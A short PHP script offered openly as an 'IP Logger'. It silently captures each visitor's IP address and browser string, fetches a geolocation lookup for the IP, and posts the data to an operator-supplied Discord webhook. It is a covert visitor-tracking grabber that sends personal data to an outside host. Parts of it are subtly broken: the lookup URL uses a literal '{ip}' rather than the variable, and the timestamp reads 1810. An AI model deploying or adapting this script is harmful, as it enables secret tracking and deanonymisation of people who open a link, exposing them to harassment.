<?php

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$url = "Your Discord Webhook Link Here";


$iplookup = file_get_contents("http://extreme-ip-lookup.com/json/{ip}");

$hookObject = json_encode([
    "username" => "IP Logger ",
    "avatar_url" => "https://cdn.discordapp.com/avatars/697209447772061706/674fbc4c538c0a83ebd10193df98f69d.png?size=256",
    "tts" => false,
    "embeds" => [
        [
            "title" => "IP Logger",
            "type" => "rich",
            "description" => "",
            "timestamp" => "1810-01-10T19:12:00-05:00",
            "color" => hexdec( "FFFFFF" ),
            "footer" => [
                "text" => "IP Logger By Junai#6684 🔧 ",
            ],

            "fields" => [
                [
                    "name" => "IP",
                    "value" => "{$ip}",
                    "inline" => true
                ],
                [
                    "name" => "Browser",
                    "value" => "{$browser}",
                    "inline" => true
                ],
                [
                    "name" => "IP Lookup",
                    "value" => "{$iplookup}",
                    "inline" => true
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );


?>
